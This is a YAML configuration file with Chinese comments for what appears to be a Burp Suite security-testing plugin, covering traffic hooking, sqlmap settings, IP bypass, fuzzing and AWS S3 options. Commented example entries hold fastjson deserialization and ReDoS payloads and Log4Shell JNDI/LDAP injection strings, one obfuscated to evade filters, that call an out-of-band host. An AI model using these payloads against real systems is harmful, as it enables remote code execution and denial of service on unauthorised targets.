logLevel: INFO # 日志等级. 日志路径 {work.dir}/run.log, 每次重启Burp或重新加载插件都会清空日志。
httpTrafficAutoModificationConfig: # HTTP Traffic Auto Modification 模块的功能配置
  hookConfig: # HTTP Traffic Hook 功能的配置
    hookService: RPC # 指定以哪种方式启用hook功能，可选：RPC、JAVA
    requestIsNeedHook: false # 请求是否需要hook，开启时hookRequestToBurp、hookRequestToServer才会被执行
    responseIsNeedHook: false # 响应是否需要hook，开启时hookResponseToBurp、hookResponseToClient才会被执行
    requestMatchExpression: 'request.getHost().equals("192.168.1.4")' # 匹配请求的表达式；用来判断哪些请求需要被hook，例如这里判断请求的host必须是192.168.1.4
    rpcConn: 127.0.0.1:8443 # 当hookService为RPC时，RPC服务端的连接串
    javaFilePath: '' # 当hookService为JAVA时，Java的文件路径
  decorateConfig: # HTTP Traffic Decorate 功能的配置
    requestModifyExpression: '' # 请求修改的表达式
    responseModifyExpression: '' # 响应修改的表达式
  ruleMatchConfig: # HTTP Traffic Special Rule Match 功能的配置
    requestParamMatches: { } # 对请求参数进行匹配的配置, eg: {"url": 3}
    responseHeaderMatches: { } # 对响应头进行匹配的配置, eg: {"x-powered-by": 3}
    responseContentMatches: { } # 对响应内容进行匹配的配置, eg: {"password": 3}
mixedConfig: # Mixed 模块的功能配置
  sqlMapConfig: # Message To SqlMap 功能的配置
    path: sqlmap # 指定sqlmap可执行文件路径
    arg: --force-ssl --risk=3 --level=3 # 处理时的参数
bypassConfig: # Bypass 模块的功能配置
  bypassIPDefaultValue: 127.0.0.1 # Bypass IP中的IP值
fuzzConfig: # Fuzz 模块的功能配置
  swaggerGeneratedRequestAutoSend: false # 通过FuzzSwaggerDocs生成的请求是否发送给服务端
payloadConfig: { }  # Payload 模块的功能配置 eg：
#  fastjson:
#    1.2.48-ser-rce: '[{"@type":"java.net.InetAddress","val":"{${BurpUtil.generateCollaboratorPayload()}}"}]'
#    1.2.60-re-dos: '[{"name":"\\x]'
#  log4j2:
#    simple: "$${jndi:ldap://{${BurpUtil.generateCollaboratorPayload()}}}"
#    mutation: "$${$${env:base:-j}$${lower:N}di:l$${lower:D}$${env:base:-a}p://{${BurpUtil.generateCollaboratorPayload()}}}"
cloudConfig: # Cloud 模块的功能配置
  awsConfig: # aws配置
    service: s3 # 要使用过的服务
    ak: ''
    sk: ''
    region: cn-northwest-1
    token: '' # 临时toke
